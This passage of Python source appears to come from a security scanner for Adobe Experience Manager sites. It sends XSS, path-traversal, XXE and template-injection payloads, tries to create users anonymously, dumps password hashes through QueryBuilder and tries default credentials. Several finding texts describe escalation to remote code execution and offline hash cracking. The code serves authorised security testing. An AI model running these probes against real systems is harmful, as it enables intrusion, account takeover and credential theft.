        if r is None or r.status_code != 200:
            return None
        try:
            data = r.json()
            tok = data.get("token")
            if tok:
                self._csrf_token = tok
                self.client.session.headers["CSRF-Token"] = tok
                self.logger.debug(f"CSRF token: {tok[:12]}...")
                return tok
        except Exception:
            return None
        return None

    # =======================================================================
    # 15. Misc: robots.txt + sitemap.xml + headers
    # =======================================================================
    def check_misc(self) -> None:
        if not self._enabled("misc"):
            return
        self.logger.section("Misc / headers")

        for p in ("/robots.txt", "/sitemap.xml", "/etc/map.json", "/.well-known/security.txt"):
            r = self.client.get(p)
            if r is not None and r.status_code == 200 and len(r.content) > 0:
                self.reporter.add(Finding(
                    title=f"{p} reachable",
                    severity=SEV_INFO, category=CAT_DISCLOSURE,
                    target=self.target + p,
                    evidence=f"HTTP 200 | {len(r.content)} bytes",
                    description="Informational — useful for recon / scoping.",
                    response_snippet=safe_response_text(r, 600),
                ))

        # Check for missing security headers on the homepage
        r = self.client.get("/")
        if r is not None:
            missing = []
            for h in ("Content-Security-Policy", "Strict-Transport-Security",
                      "X-Frame-Options", "X-Content-Type-Options",
                      "Referrer-Policy", "Permissions-Policy"):
                if h not in r.headers:
                    missing.append(h)
            if missing:
                self.reporter.add(Finding(
                    title="Missing security headers on root",
                    severity=SEV_LOW, category=CAT_MISCONFIG,
                    target=self.target + "/",
                    evidence="Missing: " + ", ".join(missing),
                    description="Defensive headers absent.",
                ))

    # =======================================================================
    # 15b. Modern CVE wave (2022-2024) — all anonymous-checkable
    # =======================================================================
    def check_modern_cves(self) -> None:
        if not self._enabled("cve"):
            return
        self.logger.section("Modern CVE wave (2022-2024) probes")

        # CVE-2024-43712 / CVE-2024-43711 / CVE-2024-32813 / CVE-2024-32812 /
        # CVE-2024-32811 — AEM Sites stored/reflected XSS in editor & content
        # endpoints. Anonymous reachability matters: if the sink renders to anon
        # visitors of a publish instance, that's a stored-XSS pivot.
        xss_marker = "aemhntr" + "".join(random.choices(string.ascii_lowercase, k=6))
        xss_probes = [
            ("/content/<svg/onload=alert(1)>.html", f"<svg/onload=alert(1)>",
             "Content-path reflected XSS (CVE-2024-43712 family)", "CVE-2024-43712"),
            ("/libs/wcm/foundation/components/page/redirect.html?path=javascript:alert(1)",
             "javascript:alert(1)",
             "WCM redirect open-redirect to javascript: (CVE-2024-43711 baseline)", "CVE-2024-43711"),
            ("/etc/clientlibs/foundation/jquery.js/{m}<script>alert(1)</script>.html".replace("{m}", xss_marker),
             "<script>alert(1)</script>",
             "Foundation jQuery clientlib selector reflected XSS", "CVE-2024-32813"),
            ("/libs/granite/csrf/token.json?_={m}<svg/onload=alert(1)>".replace("{m}", xss_marker),
             "<svg/onload=alert(1)>",
             "CSRF token endpoint reflected XSS", None),
            ("/libs/granite/core/content/login.html?resource=<script>alert(1)</script>",
             "<script>alert(1)</script>",
             "Granite login resource= reflected XSS (CVE-2024-32811 family)", "CVE-2024-32811"),
        ]
        for path, marker, label, cve in xss_probes:
            r = self.client.get(path)
            if r is None or r.status_code != 200 or self._is_authwall(r):
                continue
            body = r.text or ""
            if marker in body:
                self.reporter.add(Finding(
                    title=label,
                    severity=SEV_MEDIUM, category=CAT_XSS,
                    target=self.target + path, cve=cve,
                    evidence=f"Marker reflected unescaped: {marker[:60]}",
                    description=("Attacker payload was reflected into the response body without "
                                 "encoding. Confirm renderability in a real browser before "
                                 "reporting (some sinks reflect into JSON or comments)."),
                    references=["https://helpx.adobe.com/security/products/aem.html"],
                    request=self.client.request_signature("GET", path),
                    response_snippet=snippet(body, 400),
                ))

        # CVE-2024-20767 — AEM Forms JEE arbitrary file read via crafted servlet
        # request. Anonymous read of /etc/passwd or local files via Forms servlet.
        forms_traversal_probes = [
            "/adminui/aem/forms/manage/document?path=../../../../etc/passwd",
            "/adminui/aem/forms/manage/document?path=file:///etc/passwd",
            "/lc/cf/upload?file=../../../../etc/passwd",
        ]
        for path in forms_traversal_probes:
            r = self.client.get(path)
            if r is not None and r.status_code == 200 and "root:" in (r.text or ""):
                self.reporter.add(Finding(
                    title="AEM Forms JEE arbitrary file read (CVE-2024-20767)",
                    severity=SEV_CRITICAL, category=CAT_CVE,
                    target=self.target + path, cve="CVE-2024-20767",
                    evidence="/etc/passwd contents reflected (root:x:...).",
                    description=("AEM Forms on JEE allowed an unauthenticated path-traversal read. "
                                 "Pivot to read AEM config files, secret stores, and JCR exports."),
                    references=["https://helpx.adobe.com/security/products/aem-forms/apsb24-15.html"],
                    request=self.client.request_signature("GET", path),
                    response_snippet=safe_response_text(r, 400),
                ))
                break

        # CVE-2024-20736 — AEM Forms XSS in form fields rendered to anon visitors
        forms_xss = "/lc/libs/fd/form/components/output/output.html?path=<svg/onload=alert(1)>"
        r = self.client.get(forms_xss)
        if r is not None and r.status_code == 200 and "<svg/onload=alert(1)>" in (r.text or ""):
            self.reporter.add(Finding(
                title="AEM Forms output reflected XSS (CVE-2024-20736)",
                severity=SEV_MEDIUM, category=CAT_CVE,
                target=self.target + forms_xss, cve="CVE-2024-20736",
                evidence="<svg/onload=alert(1)> reflected unescaped.",
                description="AEM Forms output component reflected attacker SVG handler.",
                references=["https://helpx.adobe.com/security/products/aem-forms/apsb24-15.html"],
                request=self.client.request_signature("GET", forms_xss),
                response_snippet=safe_response_text(r, 400),
            ))

        # CVE-2023-22368 / CVE-2023-22366 / CVE-2023-22365 — AEM XSS via path/selector
        for path, cve, label in (
            ("/content/dam/<svg/onload=alert(1)>.html", "CVE-2023-22368", "DAM path reflected XSS"),
            ("/content/.<svg/onload=alert(1)>.html",     "CVE-2023-22366", "Content selector reflected XSS"),
            ("/etc/<svg/onload=alert(1)>.html",          "CVE-2023-22365", "/etc selector reflected XSS"),
        ):
            r = self.client.get(path)
            if r is not None and r.status_code == 200 and "<svg/onload=alert(1)>" in (r.text or ""):
                self.reporter.add(Finding(
                    title=label + f" ({cve})",
                    severity=SEV_MEDIUM, category=CAT_CVE,
                    target=self.target + path, cve=cve,
                    evidence="<svg/onload=alert(1)> reflected unescaped.",
                    description="AEM Sites path/selector reflected XSS.",
                    references=["https://helpx.adobe.com/security/products/aem.html"],
                    request=self.client.request_signature("GET", path),
                    response_snippet=safe_response_text(r, 400),
                ))

        # CVE-2022-30679 / CVE-2022-30680 — AEM Forms component XSS / arbitrary code
        forms2022 = [
            ("/lc/content/forms/af/<svg/onload=alert(1)>.html", "<svg/onload=alert(1)>",
             "AEM Forms AF component reflected XSS (CVE-2022-30679)", "CVE-2022-30679"),
            ("/libs/fd/fp/components/studio/process/process.html?path=<svg/onload=alert(1)>",
             "<svg/onload=alert(1)>",
             "AEM Forms FP process reflected XSS (CVE-2022-30680)", "CVE-2022-30680"),
        ]
        for path, marker, label, cve in forms2022:
            r = self.client.get(path)
            if r is not None and r.status_code == 200 and marker in (r.text or ""):
                self.reporter.add(Finding(
                    title=label, severity=SEV_MEDIUM, category=CAT_CVE,
                    target=self.target + path, cve=cve,
                    evidence=f"Marker reflected: {marker}",
                    description="AEM Forms component reflected XSS.",
                    references=["https://helpx.adobe.com/security/products/aem-forms.html"],
                    request=self.client.request_signature("GET", path),
                    response_snippet=safe_response_text(r, 300),
                ))

        # CVE-2022-23710 — AEM Forms XML/XXE via crafted SOAP envelope
        soap = ('<?xml version="1.0"?>'
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
                '<soap:Body><ping>&xxe;</ping></soap:Body></soap:Envelope>')
        for ep in ("/soap/services/UserManagerService", "/soap/services/FormDataIntegration",
                   "/soap/services/ContentService"):
            r = self.client.post(ep, data=soap,
                                 headers={"Content-Type": "text/xml",
                                          "SOAPAction": "\"\""})
            if r is not None and "root:" in (r.text or ""):
                self.reporter.add(Finding(
                    title="AEM Forms SOAP XXE (CVE-2022-23710)",
                    severity=SEV_CRITICAL, category=CAT_XXE,
                    target=self.target + ep, cve="CVE-2022-23710",
                    evidence="SOAP body reflected /etc/passwd contents.",
                    description="AEM Forms SOAP service parsed external entities (XXE).",
                    references=["https://helpx.adobe.com/security/products/aem-forms.html"],
                    request=f"POST {ep} (text/xml SOAP XXE)",
                    response_snippet=safe_response_text(r, 400),
                ))
                break

        # CVE-2021-44519 — AEM Forms file-upload XXE via PDF/XML profile
        # (lightweight probe: just check the susceptible servlet is reachable)
        r = self.client.get("/lc/cf/upload")
        if r is not None and r.status_code == 200 and not self._is_authwall(r):
            self.reporter.add(Finding(
                title="AEM Forms cf/upload reachable (CVE-2021-44519 baseline)",
                severity=SEV_HIGH, category=CAT_CVE,
                target=self.target + "/lc/cf/upload", cve="CVE-2021-44519",
                evidence="HTTP 200 on /lc/cf/upload (not a login page).",
                description="AEM Forms file upload endpoint reachable — manually verify XXE via "
                            "a crafted XFA/PDF payload.",
                references=["https://helpx.adobe.com/security/products/aem-forms/apsb22-02.html"],
                request=self.client.request_signature("GET", "/lc/cf/upload"),
            ))

        # CVE-2019-8088 / 8087 / 8086 — AEM Forms XSS via specific endpoints
        for path, cve, label in (
            ("/lc/libs/granite/security/userinfo.json?_charset_=<svg/onload=alert(1)>",
             "CVE-2019-8088", "AEM Forms userinfo charset XSS"),
            ("/lc/libs/cq/ui/widgets.js?debugClientLibs=true&path=<svg/onload=alert(1)>",
             "CVE-2019-8087", "AEM Forms widgets debugClientLibs XSS"),
            ("/lc/etc/designs/default/0.gif/<svg%20onload=alert(1)>.html",
             "CVE-2019-8086", "AEM Forms designs default gif XSS"),
        ):
            r = self.client.get(path)
            if r is not None and r.status_code == 200 and "<svg" in (r.text or ""):
                self.reporter.add(Finding(
                    title=label + f" ({cve})",
                    severity=SEV_MEDIUM, category=CAT_CVE,
                    target=self.target + path, cve=cve,
                    evidence="<svg> payload reflected.",
                    description="AEM Forms reflected XSS in the indicated endpoint.",
                    references=["https://helpx.adobe.com/security/products/aem-forms.html"],
                    request=self.client.request_signature("GET", path),
                ))

        # CVE-2018-19298 / 19297 — AEM XSS via cq:contentSyncMappingList / SiteCatalyst
        for path, cve, label in (
            ("/etc/segmentation.html?segment=<svg/onload=alert(1)>", "CVE-2018-19298",
             "Segmentation HTML reflected XSS"),
            ("/libs/cq/analytics/components/sitecatalystpage/segments.json?segment=<svg/onload=alert(1)>",
             "CVE-2018-19297", "SiteCatalyst segments reflected XSS"),
        ):
            r = self.client.get(path)
            if r is not None and r.status_code == 200 and "<svg/onload=alert(1)>" in (r.text or ""):
                self.reporter.add(Finding(
                    title=label + f" ({cve})",
                    severity=SEV_MEDIUM, category=CAT_CVE,
                    target=self.target + path, cve=cve,
                    evidence="<svg/onload=alert(1)> reflected.",
                    description="AEM reflected XSS in the indicated endpoint.",
                    references=["https://helpx.adobe.com/security/products/aem.html"],
                    request=self.client.request_signature("GET", path),
                ))

        # CVE-2017-3104 — AEM server-side template injection via #set/#if
        ssti_probes = [
            "/content/#set($a=1234%2b1)$a.html",
            "/content/#{1234%2b1}.html",
        ]
        for path in ssti_probes:
            r = self.client.get(path)
            if r is not None and r.status_code == 200 and "1235" in (r.text or ""):
                self.reporter.add(Finding(
                    title="AEM Server-Side Template Injection (CVE-2017-3104)",
                    severity=SEV_CRITICAL, category=CAT_CVE,
                    target=self.target + path, cve="CVE-2017-3104",
                    evidence="Template expression evaluated server-side (1234+1=1235 reflected).",
                    description="Velocity / template injection — escalate to RCE via well-known "
                                "SSTI gadgets.",
                    references=["https://nvd.nist.gov/vuln/detail/CVE-2017-3104"],
                    request=self.client.request_signature("GET", path),
                    response_snippet=safe_response_text(r, 400),
                ))
                break

        # CVE-2025-49533 — AEM Forms JEE deserialization (POST sink)
        # Quick reachability probe (deserialization confirmed in check_externaljob_deser)
        r = self.client.get("/adminui/configuration")
        if r is not None and r.status_code == 200 and not self._is_authwall(r):
            self.reporter.add(Finding(
                title="AEM Forms JEE /adminui/configuration reachable (CVE-2025-49533 baseline)",
                severity=SEV_HIGH, category=CAT_CVE,
                target=self.target + "/adminui/configuration", cve="CVE-2025-49533",
                evidence="HTTP 200 on /adminui/configuration (not a login page).",
                description=("AEM Forms JEE configuration endpoint reachable. CVE-2025-49533 is a "
                             "deserialization RCE in the Forms JEE manager — confirm with a "
                             "ysoserial gadget against the POST endpoint."),
                references=["https://helpx.adobe.com/security/products/aem-forms.html"],
                request=self.client.request_signature("GET", "/adminui/configuration"),
            ))

    # =======================================================================
    # 15c. Anonymous user creation via Sling POST authorizables servlet
    # =======================================================================
    def check_anonymous_user_create(self) -> None:
        if not self._enabled("slingpost"):
            return
        self.logger.section("Anonymous user-creation probe")
        marker = "aemhntr" + "".join(random.choices(string.ascii_lowercase, k=8))
        # POST to the authorizables servlet to try and create a user.
        data = {
            ":operation": "createUser",
            ":name": marker,
            "rep:password": "AemHunter!2026" + marker,
            "_charset_": "utf-8",
        }
        for path in ("/libs/granite/security/post/authorizables",
                     "/libs/granite/security/post/authorizables.html",
                     "/home/users/*"):
            r = self.client.post(path, data=data)
            if r is None:
                continue
            if r.status_code in (200, 201) and not self._is_authwall(r):
                body = r.text or ""
                # Verify a real user node was created by trying to read it
                v = self.client.get(f"/home/users/.children.json")
                if marker in body or (v is not None and marker in (v.text or "")):
                    self.reporter.add(Finding(
                        title=f"Anonymous user CREATION accepted (Sling POST)",
                        severity=SEV_CRITICAL, category=CAT_JCR,
                        target=self.target + path,
                        evidence=f"Created user '{marker}' anonymously via :operation=createUser.",
                        description=("The Sling POST servlet accepted an unauthenticated user-creation "
                                     "request. An attacker can register a privileged AEM account at "
                                     "will — direct path to authenticated access and further escalation."),
                        references=["https://sling.apache.org/documentation/bundles/manipulating-content-the-slingpostservlet-servlets-post.html"],
                        request=f"POST {path} (:operation=createUser&:name={marker}&rep:password=...)",
                        response_snippet=safe_response_text(r, 400),
                    ))
                    return

    # =======================================================================
    # 15d. Extended OSGi/Felix console exposure sweep
    # =======================================================================
    def check_osgi_consoles_extended(self) -> None:
        if not self._enabled("exposure"):
            return
        self.logger.section("Extended Felix / OSGi console sweep")

        def probe(entry):
            path, sev, label, sig = entry
            r = self.client.get(path)
            if r is None or r.status_code != 200 or self._is_authwall(r):
                return
            body = safe_response_text(r, 4000)
            if sig and not re.search(sig, body, re.I):
                return
            # Avoid duplicate findings from check_consoles for the same root paths.
            if path in ("/system/console", "/system/console/bundles",
                        "/system/console/bundles.json", "/crx/de/index.jsp",
                        "/crx/packmgr/index.jsp", "/bin/groovyconsole",
                        "/bin/groovyconsole.html", "/etc/groovyconsole.html"):
                return
            self.reporter.add(Finding(
                title=label + " reachable",
                severity=sev, category=CAT_EXPOSURE,
                target=self.target + path,
                evidence=f"HTTP 200 ({len(r.content)} bytes), signature matched, not a login page.",
                description=(f"{path} returned real content anonymously. Each Felix/OSGi "
                             "console exposes enumeration data (bundles, services, config, "
                             "threads, memory, JMX MBeans) and several allow privileged "
                             "POST operations — direct RCE vectors when reachable."),
                references=["https://felix.apache.org/documentation/subprojects/apache-felix-web-console.html",
                            "https://github.com/0ang3el/aem-hacker"],
                request=self.client.request_signature("GET", path),
                response_snippet=snippet(body, 400),
            ))

        with cf.ThreadPoolExecutor(max_workers=self.threads) as ex:
            list(ex.map(probe, OSGI_CONSOLE_PATHS))

    # =======================================================================
    # 15e. Open-redirect probes (AEM-known sinks)
    # =======================================================================
    def check_open_redirect(self) -> None:
        if not self._enabled("redirect"):
            return
        self.logger.section("Open-redirect probes")
        marker = "aemhunter-redir-" + "".join(random.choices(string.ascii_lowercase, k=6))
        evil = f"https://example.com/{marker}"
        evil_q = up.quote(evil, safe="")
        candidates = [
            f"/?resource={evil_q}",
            f"/libs/granite/core/content/login.html?resource={evil_q}",
            f"/system/sling/redirect?url={evil_q}",
            f"/system/sling/redirect.html?url={evil_q}",
            f"/etc/redirect?path={evil_q}",
            f"/content/redirect?url={evil_q}",
            f"/?redirect={evil_q}",
            f"/?return={evil_q}",
            f"/?next={evil_q}",
            f"/libs/wcm/foundation/components/page/redirect.html?path={evil_q}",
        ]
        for path in candidates:
            r = self.client.get(path)
            if r is None:
                continue
            if 300 <= r.status_code < 400:
                loc = r.headers.get("Location", "")
                if marker in loc or "example.com" in loc:
                    self.reporter.add(Finding(
                        title=f"Open redirect: {path.split('?')[0]}",
                        severity=SEV_MEDIUM, category=CAT_MISCONFIG,
                        target=self.target + path,
                        evidence=f"HTTP {r.status_code} -> {loc}",
                        description=("The endpoint redirects to an arbitrary attacker-controlled "
                                     "URL. Useful for phishing pretexts and chaining with OAuth "
                                     "flows on the AEM site."),
                        references=["https://owasp.org/www-community/attacks/Unvalidated_Redirects_and_Forwards_Cheat_Sheet"],
                        request=self.client.request_signature("GET", path),
                    ))
            # Also catch HTML meta-refresh or JS redirects to attacker URL
            elif r.status_code == 200 and not self._is_authwall(r):
                body = (r.text or "")[:8000]
                if (f"window.location.replace(\"{evil}\"" in body
                        or f"<meta http-equiv=\"refresh\" content=\"0;url={evil}" in body
                        or f"location.href=\"{evil}" in body):
                    self.reporter.add(Finding(
                        title=f"Open redirect via HTML/JS: {path.split('?')[0]}",
                        severity=SEV_MEDIUM, category=CAT_MISCONFIG,
                        target=self.target + path,
                        evidence=f"Body redirects to {evil} (HTML/JS sink).",
                        description="The endpoint emits an HTML/JS redirect to an attacker-controlled URL.",
                        request=self.client.request_signature("GET", path),
                    ))

    # =======================================================================
    # 15f. QueryBuilder injection / property-exfil
    # =======================================================================
    def check_querybuilder_injection(self) -> None:
        if not self._enabled("querybuilder"):
            return
        self.logger.section("QueryBuilder property-exfiltration / injection probes")
        # If QueryBuilder is reachable, try Egorov's selective-properties trick
        # to coax it into yielding rep:password hashes.
        url = ("/bin/querybuilder.json?type=rep:User&p.hits=selective"
               "&p.properties=rep:principalName%20rep:password%20profile/email"
               "&p.limit=200")
        r = self.client.get(url)
        if r is None or r.status_code != 200 or self._is_authwall(r):
            return
        body = r.text or ""
        if '"rep:password"' in body:
            hashes = re.findall(r'"rep:password"\s*:\s*"([^"]+)"', body)
            if hashes:
                self.reporter.add(Finding(
                    title=f"QueryBuilder rep:password HASH dump anonymously — {len(hashes)} hashes",
                    severity=SEV_CRITICAL, category=CAT_DISCLOSURE,
                    target=self.target + url.split("?")[0],
                    evidence=f"Recovered {len(hashes)} rep:password hashes via QueryBuilder "
                             f"selective properties. Sample: {hashes[0][:48]}...",
                    description=("Anonymous QueryBuilder selective-properties dump returned "
                                 "rep:password hashes. Crack offline (salted SHA-256) to take "
                                 "over admin / privileged accounts."),
                    references=["https://github.com/0ang3el/aem-hacker",
                                "https://www.slideshare.net/0ang3el/hacking-aem-sites"],
                    request=self.client.request_signature("GET", url),
                    response_snippet="; ".join(h[:40] for h in hashes[:5]),
                ))
        elif '"success"' in body and '"hits"' in body:
            n = body.count('"jcr:path"')
            self.reporter.add(Finding(
                title=f"QueryBuilder selective-property dump worked — {n} users enumerated",
                severity=SEV_HIGH, category=CAT_DISCLOSURE,
                target=self.target + url.split("?")[0],
                evidence=f"QueryBuilder returned {n} rep:User hits (rep:password hidden "
                         "but PII exposed).",
                description="QueryBuilder selective-properties leak — user directory readable.",
                references=["https://github.com/0ang3el/aem-hacker"],
                request=self.client.request_signature("GET", url),
                response_snippet=snippet(body, 400),
            ))

        # XPath injection: try crafted predicate that exposes internal paths
        xpath_inj = ("/bin/querybuilder.json?type=nt:base&path=/&p.hits=full&p.limit=5"
                     "&1_property=jcr:primaryType"
                     "&1_property.value=rep:User")
        r = self.client.get(xpath_inj)
        if r is not None and r.status_code == 200 and not self._is_authwall(r):
            b = r.text or ""
            if '"rep:authorizableId"' in b or '"rep:principalName"' in b:
                self.reporter.add(Finding(
                    title="QueryBuilder cross-type rep:User enumeration",
                    severity=SEV_HIGH, category=CAT_DISCLOSURE,
                    target=self.target + xpath_inj.split("?")[0],
                    evidence="Cross-type query returned rep:User nodes — full user enum.",
                    description="QueryBuilder API allows filtered queries across the whole "
                                "repository — pivot to dump rep:User / rep:Group nodes.",
                    request=self.client.request_signature("GET", xpath_inj),
                    response_snippet=snippet(b, 400),
                ))

    # =======================================================================
    # 15g. GraphQL endpoint introspection
    # =======================================================================
    def check_graphql_introspection(self) -> None:
        if not self._enabled("graphql"):
            return
        self.logger.section("GraphQL introspection probes")
        introspection = '{"query":"{__schema{types{name kind}}}"}'
        endpoints = [
            "/content/graphql/global/endpoint.json",
            "/content/cq:graphql/global/endpoint.json",
            "/content/graphql/endpoint.json",
            "/graphql",
            "/api/graphql",
        ]
        for ep in endpoints:
            r = self.client.post(ep, data=introspection,
                                 headers={"Content-Type": "application/json"})
            if r is None or r.status_code not in (200, 400):
                continue
            body = r.text or ""
            if '"__schema"' in body or '"types"' in body:
                self.reporter.add(Finding(
                    title=f"GraphQL introspection enabled at {ep}",
                    severity=SEV_MEDIUM, category=CAT_DISCLOSURE,
                    target=self.target + ep,
                    evidence="Introspection query returned schema types.",
                    description=("GraphQL introspection is enabled unauthenticated — schema "
                                 "leaks reveal types, queries, mutations. Combine with "
                                 "QueryBuilder / Sling info disclosure to map the API surface."),
                    references=["https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL"],
                    request=f"POST {ep}  Content-Type: application/json\n\n{introspection}",
                    response_snippet=snippet(body, 400),
                ))
                break

    # =======================================================================
    # 15h. WebDAV method enumeration (OPTIONS) + raw PROPFIND
    # =======================================================================
    def check_webdav_methods(self) -> None:
        if not self._enabled("webdav"):
            return
        self.logger.section("WebDAV method enumeration")
        for ep in ("/", "/crx/server/crx.default", "/crx/server", "/crx/repository/crx.default"):
            r = self.client.options(ep)
            if r is None:
                continue
            allow = r.headers.get("Allow", "") + " " + r.headers.get("DAV", "")
            dangerous = [m for m in ("PUT", "DELETE", "MOVE", "COPY", "MKCOL",
                                     "PROPFIND", "PROPPATCH", "LOCK", "UNLOCK")
                         if m in allow.upper()]
            if dangerous:
                sev = SEV_CRITICAL if any(m in dangerous for m in ("PUT", "DELETE", "MKCOL", "MOVE")) else SEV_HIGH
                self.reporter.add(Finding(
                    title=f"WebDAV methods exposed on {ep}: {', '.join(dangerous)}",
                    severity=sev, category=CAT_EXPOSURE,
                    target=self.target + ep,
                    evidence=f"OPTIONS returned Allow/DAV header listing {', '.join(dangerous)}",
                    description=("WebDAV write methods are reachable unauthenticated on this path. "
                                 "PUT/MKCOL/MOVE allow arbitrary repo write -> JSP/OSGi-bundle drop "
                                 "into /apps for RCE. Confirm with a benign MKCOL of a throwaway "
                                 "path."),
                    references=["https://book.hacktricks.xyz/pentesting/pentesting-web/adobe-experience-manager-aem"],
                    request=f"OPTIONS {ep}",
                    response_snippet=f"Allow: {r.headers.get('Allow','')}\nDAV: {r.headers.get('DAV','')}",
                ))

    # =======================================================================
    # 18. Extra exposed servlets (ported from 0ang3el/aem-hacker)
    # =======================================================================
    def check_aemhacker_servlets(self) -> None:
        if not self._enabled("servlets"):
            return
        self.logger.section("Extra servlet exposure probes (aem-hacker)")
        ref = {"Referer": self.client.base_url}

        # --- GQLServlet: /bin/wcm/search/gql -> JSON with 'hits' ---
        for p in ("/bin/wcm/search/gql.servlet.json?query=type:base%20limit:..1&pathPrefix=",
                  "/bin/wcm/search/gql.json?query=type:base%20limit:..1&pathPrefix=",
                  "/bin/wcm/search/gql.json;%0aa.css?query=type:base%20limit:..1&pathPrefix="):
            r = self.client.get(p)
            if r is not None and r.status_code == 200 and not self._is_authwall(r) and '"hits"' in (r.text or ""):
                self.reporter.add(Finding(
                    title=f"GQLServlet exposed {self._role_tag()}",
                    severity=SEV_HIGH, category=CAT_DISCLOSURE, target=self.target + p,
                    evidence="GQL query returned 'hits' JSON.",
                    description="Apache Jackrabbit GQL search servlet is reachable — enumerate "
                                "JCR content/users via GQL queries.",
                    references=["https://github.com/0ang3el/aem-hacker"],
                    request=self.client.request_signature("GET", p),
                    response_snippet=safe_response_text(r, 400)))
                break

        # --- LoginStatusServlet: exposure + default-credential bruteforce ---
        for p in ("/system/sling/loginstatus.json", "/system/sling/loginstatus.css",
                  "///system///sling///loginstatus.json", "/system/sling/loginstatus.json;%0aa.css"):
            r = self.client.get(p)
            if r is not None and r.status_code == 200 and "authenticated=" in (r.text or ""):
                self.reporter.add(Finding(
                    title=f"LoginStatusServlet exposed {self._role_tag()}",
                    severity=SEV_LOW, category=CAT_DISCLOSURE, target=self.target + p,
                    evidence="loginstatus returns 'authenticated=' — usable to validate creds.",
                    description="Lets an attacker validate/bruteforce credentials without lockout.",
                    references=["https://github.com/0ang3el/aem-hacker"],
                    request=self.client.request_signature("GET", p)))
                # Try default creds against it (strong positive on authenticated=true).
                for user, pw in DEFAULT_CREDENTIALS[:14]:
                    tok = base64.b64encode(f"{user}:{pw}".encode()).decode()
                    rr = self.client.get(p, headers={"Authorization": f"Basic {tok}"})
                    if rr is not None and "authenticated=true" in (rr.text or ""):
                        self.reporter.add(Finding(
                            title=f"Default credentials accepted: {user}:{pw}",
                            severity=SEV_CRITICAL, category=CAT_AUTH, target=self.target + p,
                            evidence=f"loginstatus reported authenticated=true for {user}:{pw}",
                            description="A well-known default credential is valid -> admin access -> RCE.",
                            references=["https://github.com/0ang3el/aem-hacker"]))
                break

        # --- WCMDebugFilter reflected XSS (CVE-2016-7882) ---
        for p in ("/.json?debug=layout", "/content.json?debug=layout", "/content.json/a.css?debug=layout"):
            r = self.client.get(p)
            if r is not None and r.status_code == 200 and not self._is_authwall(r):
                body = r.text or ""
                if "res=" in body and "sel=" in body:
                    self.reporter.add(Finding(
                        title=f"WCMDebugFilter reflected XSS (CVE-2016-7882) {self._role_tag()}",
                        severity=SEV_MEDIUM, category=CAT_XSS, target=self.target + p,
                        evidence="debug=layout reflected res=/sel= markers.",
                        description="WCMDebugFilter is enabled and reflects the debug selector — "
                                    "reflected XSS. Confirm the payload renders in a browser.",
                        references=["https://nvd.nist.gov/vuln/detail/CVE-2016-7882"],
                        request=self.client.request_signature("GET", p)))
                    break

        # --- WCMSuggestionsServlet reflected XSS ---
        xmark = "x" + "".join(random.choices(string.ascii_lowercase, k=8)) + "x"
        for p in ("/bin/wcm/contentfinder/connector/suggestions.json?query_term=path%3a/&pre=<{m}>&post=y",
                  "/bin/wcm/contentfinder/connector/suggestions.json/a.css?query_term=path%3a/&pre=<{m}>&post=y"):
            pp = p.format(m=xmark)
            r = self.client.get(pp)
            if r is not None and r.status_code == 200 and f"<{xmark}>" in (r.text or ""):
                self.reporter.add(Finding(
                    title=f"WCMSuggestionsServlet reflected XSS {self._role_tag()}",
                    severity=SEV_MEDIUM, category=CAT_XSS, target=self.target + pp,
                    evidence=f"Unescaped marker <{xmark}> reflected in response.",
                    description="contentfinder suggestions servlet reflects 'pre'/'post' unescaped -> XSS.",
                    references=["https://github.com/0ang3el/aem-hacker"],
                    request=self.client.request_signature("GET", pp),
                    response_snippet=safe_response_text(r, 300)))
                break

        # --- AuditLogServlet ---
        for p in ("/bin/msm/audit.json", "/bin/msm/audit.json;%0aa.css", "///bin///msm///audit.json"):
            r = self.client.get(p)
            if r is not None and r.status_code == 200 and not self._is_authwall(r):
                try:
                    if int(json.loads(r.text).get("results", 0)) > 0:
                        self.reporter.add(Finding(
                            title=f"AuditLogServlet exposed {self._role_tag()}",
                            severity=SEV_MEDIUM, category=CAT_DISCLOSURE, target=self.target + p,
                            evidence="audit servlet returned audit records.",
                            description="MSM audit log records are exposed (who-changed-what disclosure).",
                            references=["https://github.com/0ang3el/aem-hacker"],
                            request=self.client.request_signature("GET", p)))
                        break
                except Exception:
                    pass

        # --- CRXDE logs ---
        for p in ("/bin/crxde/logs?tail=100", "/bin/crxde/logs.html?tail=100",
                  "/bin/crxde/logs;%0aa.css?tail=100", "///bin///crxde///logs?tail=100"):
            r = self.client.get(p)
            if r is not None and r.status_code == 200 and ("*WARN*" in (r.text or "") or "*INFO*" in (r.text or "") or "*ERROR*" in (r.text or "")):
                self.reporter.add(Finding(
                    title=f"CRXDE logs exposed {self._role_tag()}",
                    severity=SEV_MEDIUM, category=CAT_DISCLOSURE, target=self.target + p,
                    evidence="Live error.log tail is readable.",
                    description="CRXDE log tailing is exposed — leaks paths, stack traces, internals.",
                    references=["https://github.com/0ang3el/aem-hacker"],
                    request=self.client.request_signature("GET", p),
                    response_snippet=safe_response_text(r, 300)))
                break

        # --- Disk Usage report ---
        for p in ("/etc/reports/diskusage.html", "///etc///reports///diskusage.html"):
            r = self.client.get(p)
            if r is not None and r.status_code == 200 and not self._is_authwall(r) and "Disk Usage" in (r.text or ""):
                self.reporter.add(Finding(
                    title=f"Disk Usage report exposed {self._role_tag()}",
                    severity=SEV_LOW, category=CAT_DISCLOSURE, target=self.target + p,
                    evidence="'Disk Usage' report rendered.",
                    description="Operational disk-usage report exposed (minor info disclosure).",
                    references=["https://github.com/0ang3el/aem-hacker"],
                    request=self.client.request_signature("GET", p)))
                break

        # --- Reflected XSS via exposed SWF files ---
        for p in SWF_XSS_PATHS:
            r = self.client.get(p)
            if r is None or r.status_code != 200:
                continue
            ct = (r.headers.get("Content-Type", "") or "").split(";")[0].strip().lower()
            cd = r.headers.get("Content-Disposition", "")
            if ct == "application/x-shockwave-flash" and not cd:
                self.reporter.add(Finding(
                    title=f"Reflected XSS via exposed SWF {self._role_tag()}",
                    severity=SEV_MEDIUM, category=CAT_XSS, target=self.target + p.split("?")[0],
                    evidence="SWF served with x-shockwave-flash content-type and no Content-Disposition.",
                    description="A known XSS-prone Flash file is served inline — reflected XSS in "
                                "older browsers / Flash-enabled clients.",
                    references=["https://github.com/0ang3el/aem-hacker"],
                    request=self.client.request_signature("GET", p)))
                break

    # =======================================================================
    # 18b. Data-driven path checks (nuclei-templates AEM set + aem-xss)
    # =======================================================================
    def check_nuclei_paths(self) -> None:
        if not self._enabled("nuclei"):
            return
